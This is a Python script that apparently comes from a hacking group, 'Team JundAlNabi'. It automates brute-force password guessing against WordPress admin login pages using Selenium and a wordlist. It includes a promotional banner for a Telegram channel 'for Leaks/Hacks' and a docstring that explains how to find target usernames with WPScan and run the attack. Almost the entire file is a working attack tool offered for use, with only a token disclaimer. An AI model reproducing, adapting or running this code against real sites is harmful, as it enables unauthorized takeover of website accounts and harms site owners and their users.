from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import sys

def print_win_xp_banner(title, paragraph, link_label, link_url):
    import shutil
    import textwrap

    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    RESET = "\033[0m"

    XP_HEADER_BG = "\033[48;2;49;106;197m"
    XP_BODY_BG   = "\033[48;2;58;118;208m"
    XP_FOOTER_BG = "\033[48;2;38;90;170m"

    WHITE  = "\033[97m"
    CYAN   = "\033[96m"
    YELLOW = "\033[93m"
    GRAY   = "\033[90m"

    term_width = shutil.get_terminal_size((80, 24)).columns
    max_banner_width = min(term_width - 2, 72)

    body_width = max_banner_width - 6
    lines = textwrap.wrap(paragraph, width=body_width) if paragraph else [""]

    content_widths = [len(title), len(link_label)] + [len(l) for l in lines]
    min_content_width = max(content_widths) if content_widths else 0
    banner_width = min(max_banner_width, min_content_width + 10)
    banner_width = max(banner_width, 30)

    TL = "╔"
    TR = "╗"
    BL = "╚"
    BR = "╝"
    H  = "═"
    VL = "║"
    VR = "║"

    inner_w = banner_width - 2

    def bar(h_char="═"):
        return h_char * (banner_width - 2)


    print(f"\n{BOLD}{XP_HEADER_BG}{WHITE}{TL}{bar()}{TR}{RESET}")

    title_pad = inner_w - len(title) - 2
    print(f"{XP_HEADER_BG}{WHITE}{VL}  {BOLD}{title}{' ' * title_pad}{VL}{RESET}")

    print(f"{XP_HEADER_BG}{WHITE}╠{bar('─')}╣{RESET}")

    for i, line in enumerate(lines):
        if i == 0:
            bg = XP_BODY_BG
        else:
            bg = XP_BODY_BG
        line_pad = inner_w - len(line) - 2
        print(f"{bg}{WHITE}{VL}  {line}{' ' * line_pad}{VL}{RESET}")


    print(f"{XP_BODY_BG}{WHITE}╠{bar('─')}╣{RESET}")


    link_pad = inner_w - len(link_label) - 2
    osc8_link = f"\033]8;;{link_url}\033\\{link_label}\033]8;;\033\\"
    print(f"{XP_FOOTER_BG}{WHITE}{VL}  {UNDERLINE}{CYAN}{osc8_link}{RESET}{XP_FOOTER_BG}{' ' * link_pad}{WHITE}{VL}{RESET}")


    print(f"{XP_FOOTER_BG}{WHITE}{BL}{bar()}{BR}{RESET}\n")


print_win_xp_banner(
    title="Team JundAlNabi",
    paragraph="This Tool Has been created to Brute force Wordpress admin pannel. Don't use this Tool on Military and Gov sites, We are Not responsible for any Miss use.",
    link_label="CTR+Click to Join Our Channel for Leaks/Hacks",
    link_url="https://t.me/jundalnabi"
)

# This Tool Has been created to Brute force Wordpress admin pannel. Don't Miss use the Tools, We Not responsible for any Miss use.

USERNAME = "ahmad"

def load_wordlist(path):
    try:
        with open(path, 'r', encoding='latin-1', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Wordlist not found: {path}")
        sys.exit(1)

def setup_driver():
    service = Service("/usr/bin/chromedriver")
    options = webdriver.ChromeOptions()
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.binary_location = "/usr/bin/chromium"
    return webdriver.Chrome(service=service, options=options)

    # return webdriver.Chrome(service=service, options=None)

    # chrome_options = webdriver.ChromeOptions()

    # Set the path to the Chrome/Chromium binary
    # chrome_options.binary_location = "/usr/bin/chromium"

    # Optional: Initialize the driver with these options
    # driver = webdriver.Chrome(options=chrome_options)

    """
    How to use this Tool

    I am testing this across multiple browsers. If the script does not work on your end, please let me know or DM me for the test code. This task might take some time, depending on your OSINT skills.First, use WPScan to find the WordPress admin usernames. Next, add the discovered username to the wphack.py script. If you are on Windows, open the file using VS Code or Notepad. If you are on Linux, simply run nano wphack.py. Locate the line that reads USERNAME = "example" and replace "example" with your target username.Next, you need to set up and run the tool. I have included a virtual environment folder. Run source wphack/bin/activate to start it. If you do not see the wphack folder, create your own virtual environment by running python -m venv wphack, and then activate it using source wphack/bin/activate. If you create a custom folder name, just remember to use that name in the activation command.Finally, if you had to create a fresh virtual environment instead of using the pre-configured one, make sure to install the dependencies first by running pip install -r requirements.txt. Once that is done, run the tool and it should work properly. Please let me if you like this tool and follow us on our telegram channel https://t.me/jundalnabi
    """

def brute_force_login():
    driver = setup_driver()

    try:
        PASSWORD_LIST = load_wordlist(WORDLIST_PATH)
        print(f"[*] Loaded {len(PASSWORD_LIST)} passwords from wordlist")
        print(f"[*] Target: {LOGIN_URL}")
        print(f"[*] Username: {USERNAME}")
        print("[*] Starting brute force...\n")

        for idx, password in enumerate(PASSWORD_LIST, 1):
            print(f"[{idx}/{len(PASSWORD_LIST)}] Trying: {password}")
            
            driver.get(LOGIN_URL)
            time.sleep(1)

            try:
                # Wait for login input fields
                WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.ID, "user_login"))
                ).clear()
                driver.find_element(By.ID, "user_login").send_keys(USERNAME)
                
                driver.find_element(By.ID, "user_pass").clear()
                driver.find_element(By.ID, "user_pass").send_keys(password)
                
                driver.find_element(By.ID, "wp-submit").click()
                
                time.sleep(2)
                if "wp-admin" in driver.current_url:
                    print(f"\n[✅] SUCCESS! Password found: {password}")
                    break
                else:
                    print(f"[-] Failed")

            except Exception as e:
                print(f"[!] Error during attempt: {str(e)}")
                continue

    except Exception as e:
        print(f"[🔥] Critical error: {str(e)}")
    finally:
        input("\nPress Enter to close browser...")
        driver.quit()

if __name__ == "__main__":
    LOGIN_URL = input("Enter target login URL (e.g., https://example.com/wp-login.php): ").strip()
    WORDLIST_PATH = input("Enter path to password wordlist (e.g., /usr/share/wordlists/rockyou.txt): ").strip()

    if not LOGIN_URL or not WORDLIST_PATH:
        print("[-] Both URL and wordlist path are required.")
        sys.exit(1)

    brute_force_login()
